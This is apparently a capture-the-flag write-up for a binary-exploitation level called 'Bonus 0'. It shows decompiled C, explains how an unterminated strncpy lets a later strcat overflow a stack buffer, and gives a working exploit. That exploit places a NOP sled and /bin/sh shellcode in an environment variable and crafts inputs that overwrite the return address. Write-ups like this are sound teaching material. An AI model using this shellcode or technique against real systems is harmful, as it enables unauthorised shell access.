# Bonus 0

## the code

```c
char *__cdecl p(char *dest, char *s)
{
  char buf[4104]; // [esp+10h] [ebp-1008h] BYREF

  puts(s);
  read(0, buf, 0x1000u);
  *strchr(buf, 10) = 0;
  return strncpy(dest, buf, 0x14u);
}

//----- (0804851E) --------------------------------------------------------
char *__cdecl pp(char *dest)
{
  char src[20]; // [esp+28h] [ebp-30h] BYREF
  char v3[28]; // [esp+3Ch] [ebp-1Ch] BYREF

  p(src, " - ");
  p(v3, " - ");
  strcpy(dest, src);
  *(_WORD *)&dest[strlen(dest)] = unk_80486A4;
  return strcat(dest, v3);
}

//----- (080485A4) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[42]; // [esp+16h] [ebp-2Ah] BYREF

  pp(s);
  puts(s);
  return 0;
}
```

## the goal

The program read two strings on stdin, replace the \n with 0, concatenate them with a space in between and print the result.
The first 20 chars of each string are first copied with strncpy() in src[20] and v3[20] respectively. The first resulting string is then copied with strcpy() in
s[42], a space is added and then the second string is concatenated with strcat to it.
If a src provided to strncpy() is longer than n, the function will not add a '\0'.
On the stack, v3 is after src. If src[20] is not 0 ended, when copied into s[42], v3[20] will be copied in a raw after src[20]. As v3[20] is strcat thereafter, it will be copied twice, leading to a buffer overflow.
A shellcode opening a shell is placed in a env variable. It's address will be guessed with getenv() in order to replace the main return address.

To make it work, we increased the env variable address by 2 and added 7 chars to the second input.

## the hack

```sh
$ cd /tmp
$ vim gev.c
$ gcc gev.c
$ export EXPLOIT=`python -c 'print("\x90" * 50 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
$ ./a.out
$ cd ~
$ (python -c 'print("A" * 20  )' ; python -c 'print("B" * 9 + "\x02\xff\xff\xbf"  + "C" * 7)' ; cat) | ./bonus0
```
